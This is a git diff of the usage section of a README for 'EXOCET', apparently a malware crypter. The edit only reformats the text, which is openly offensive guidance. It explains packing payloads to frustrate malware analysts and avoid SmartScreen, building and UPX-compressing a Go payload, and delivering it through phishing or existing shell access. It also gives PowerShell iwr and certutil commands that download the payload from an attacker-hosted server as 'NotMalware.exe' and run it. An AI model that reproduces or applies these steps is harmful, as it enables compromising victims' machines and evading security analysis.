@@ -7,7 +7,9 @@ changtan@listerunlimited.com
 <br>
 
 <br>
+
 # Updated EXOCET Usage
+
 
 Make sure you pack your payloads to avoid any leaks of the crypter's key and further frustrate malware analysts. A commercial top-of-the-line packer like Themida is NOT required. It would raise further suspicion without something like a code-signing certificate. Without code-signing certificate, on Windows systems, SmartScreen is automatically triggered. This is the rule for all potentially unwanted programs or "PUPs". 
 
@@ -17,7 +19,13 @@ env GOOS=windows GOARCH=amd64 build -ldflags "-s -w" outputmalware.go
 upx --best outputmalware.exe
 ```
 
-Then drop the payload on your target. Using something like a phishing email, link, or if you already have shell access, deliver it using something like hosting your own server locally `python -m http.server 80' and then on the machine you are compromising, run as a powershell prompt `iwr -Uri "http://yourip/outputmalware.exe" -OutFile "NotMalware.exe"` or `certutil.exe -urlcache -split -f http://yourip/outputmalware.exe` and then `outputmalware.exe`
+Then drop the payload on your target. Using something like a phishing email, link, or if you already have shell access, deliver it using something like hosting your own server locally 
+`python -m http.server 80'` 
+and then on the machine you are compromising, run as a powershell prompt 
+`iwr -Uri "http://yourip/outputmalware.exe" -OutFile "NotMalware.exe"`
+or 
+`certutil.exe -urlcache -split -f http://yourip/outputmalware.exe`
+and then execute with `outputmalware.exe`
 
 
 <br>
